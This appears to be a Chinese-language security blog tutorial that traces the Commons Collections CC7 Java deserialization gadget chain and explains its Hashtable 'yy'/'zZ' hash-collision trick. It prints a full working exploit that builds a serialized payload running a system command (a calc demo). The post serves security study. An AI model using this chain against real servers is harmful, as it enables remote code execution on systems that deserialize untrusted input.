---
title: cc7
date: 2026-08-06 15:28:32
categories:
  - java代码审计
tags:
  - Java
  - 反序列化
  - Commons Collections
---

## cc7

后半条链和 CC1 是一样的，前半条链子需要我们自己重新写一遍。如果是逆向分析的话，还是有点难度的，所以还是直接看 yso 官方的链子。

- 前半条链子的入口类是 `Hashtable`，我们跟进去看一下。

`Hashtable` 的入口类 `readObject()` 方法调用了一个 `reconstitutionPut()` 方法。

![image-20260806145302295](/images/java-code-audit/08-cc7/20260806145302452.png)

继续 `reconstitutionPut()` 方法，跟进之后我们看到 `reconstitutionPut()` 方法调用了 `equals()` 方法，当然它也调用了 `hashCode()` 方法，如果是 `hashCode()` 这里走的话，又回到我们 CC6 的链子了，我们今天主看 CC7 的。

![image-20260806145746131](/images/java-code-audit/08-cc7/20260806145746192.png)

接下来是 `equals()` 这个方法，因为要找的话实在是太多了，直接全局搜索，定位到 `AbstractMapDecorator` 这个类中。

这个类是继承了 map 接口，因为它是 CC 包里面的 Map 类，并且能够调用父类 Map，所以把它作为链子的一部分。但是 Map 是一个接口，我们需要去找 Map 的实现类。

![image-20260806150053333](/images/java-code-audit/08-cc7/20260806150053384.png)

- 最终在 `AbstractMap` 类中的 `equals()` 方法中发现其调用了 `get()` 方法。

![image-20260806150415779](/images/java-code-audit/08-cc7/20260806150415845.png)

先把后半段exp写了

```java
ransformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);
        
```



接着

![image-20260806150753668](/images/java-code-audit/08-cc7/20260806150753729.png)

这里对传进的 Entry 对象数组进行了循环，逐个调用`e.key.equals(key)`，这里传进去的参数key如果是我们可控的，那么`AbstractMap.equals()`中的m就是我们可控的。

正常exp

```java
public class cc7 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);
        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(decorateMap,"roxci");
        serialize(hashtable);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

> 但是运行却无法弹出计算器，这里尝试打断点调试一下。

### 4. 调试与编写 EXP

- 这里我把断点打在了 `AbstractMap.equals()` 的地方，结果发现居然没有执行到 .equals() 这个方法，去看一看 yso 的链子是怎么写的。

  yso 这里的链子比我们多了一个 map，而且将两个 map 进行了比较，一看到这个就明白了。

  - **为什么要调用两次 `put()`?**

  我们需要调用的 `e.key.equal()` 方法是在 for 循环里面的，需要进入到这 for 循环才能调用。

  `Hashtable` 的 `reconstitutionPut()` 方法是被遍历调用的，

  第一次调用的时候，并不会走入到 `reconstitutionPut()` 方法 for 循环里面，因为 `tab[index]` 的内容是空的，在下面会对 `tab[index]` 进行赋值。

  - **为什么调用的两次`put()`其中map中key的值分别为yy和zZ?**

  第二次调用 `reconstitutionPut()` 进入到 for 循环的时候，此时 e 是从 tab 中取出的 lazyMap1 ，然后进入到判断中，要经过 `(e.hash == hash)` 判断为真才能走到我们想要的 `e.key.equal()` 方法中。这里判断要求取出来的 lazyMap1 对象的hash值要等都现在对象也就是 lazyMap2 的hash值，这里的hash值是通过 lazyMap 对象中的 `key.hashCode()` 得到的，也就是说 lazyMap1 的 hash 值就是 `"yy".hashCode()` ，lazyMap2 的 hash 值就是 `"zZ".hashCode()` ，而在 java 中有一个小 bug：

  ```java
  "yy".hashCode() == "zZ".hashCode()
  ```

  `yy` 和 `zZ` 由 `hashCode()` 计算出来的值是一样的。正是这个小 bug 让这里能够利用，所以这里我们需要将 map 中 `put()` 的值设置为 `yy` 和 `zZ`，才能走到我们想要的 `e.key.equal()` 方法中。

  

- **为什么在调用完 `HashTable.put()` 之后，还需要在 map2 中 `remove()` 掉 yy？**

这是因为 `HashTable.put()` 实际上也会调用到 `equals()` 方法：

当调用完 `equals()` 方法后，LazyMap2 的 key 中就会增加一个 yy 键：

![img](/images/java-code-audit/08-cc7/20260806151648557.png)

这就不能满足 hash 碰撞了，构造序列化链的时候是满足的，但是构造完成之后就不满足了，那么经过对方服务器反序列化也不能满足 hash 碰撞了，也就不会执行系统命令了，所以就在构造完序列化链之后手动删除这多出来的一组键值对。

最终exp

```java
package com.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class cc7 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        Map decorateMap1 = LazyMap.decorate(hashMap1, chainedTransformer);
        decorateMap1.put("yy",1);
        Map decorateMap2 = LazyMap.decorate(hashMap2, chainedTransformer);
        decorateMap2.put("zZ",1);
        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(decorateMap1,"1");
        hashtable.put(decorateMap2,"1");
        decorateMap2.remove("yy");
        serialize(hashtable);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

